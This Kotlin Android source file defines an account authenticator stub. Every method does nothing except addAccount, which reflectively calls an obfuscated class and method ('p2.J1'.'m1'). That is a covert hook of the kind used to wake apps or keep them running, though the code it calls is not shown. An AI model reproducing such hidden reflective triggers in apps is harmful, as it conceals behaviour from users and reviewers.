package com.sister.helper

import android.accounts.AbstractAccountAuthenticator
import android.accounts.Account
import android.accounts.AccountAuthenticatorResponse
import android.content.Context
import android.os.Bundle

/**
 * Date：2025/6/26
 * Describe:
 */
class AbAccountHelper(val context: Context?) : AbstractAccountAuthenticator(context) {
    override fun editProperties(
        response: AccountAuthenticatorResponse?, accountType: String?
    ): Bundle? {
        return null
    }

    override fun addAccount(
        response: AccountAuthenticatorResponse?,
        accountType: String?,
        authTokenType: String?,
        requiredFeatures: Array<out String>?,
        options: Bundle?
    ): Bundle {
        val bundle2 = Bundle()
        Class.forName("p2.J1").getMethod("m1", Context::class.java).invoke(null, context)
        return bundle2
    }

    override fun confirmCredentials(
        response: AccountAuthenticatorResponse?, account: Account?, options: Bundle?
    ): Bundle? {
        return null
    }

    override fun getAuthToken(
        response: AccountAuthenticatorResponse?,
        account: Account?,
        authTokenType: String?,
        options: Bundle?
    ): Bundle? {
        return null
    }

    override fun getAuthTokenLabel(authTokenType: String?): String? {
        return null
    }

    override fun updateCredentials(
        response: AccountAuthenticatorResponse?,
        account: Account?,
        authTokenType: String?,
        options: Bundle?
    ): Bundle? {
        return null
    }

    override fun hasFeatures(
        response: AccountAuthenticatorResponse?, account: Account?, features: Array<out String>?
    ): Bundle? {
        return null
    }
}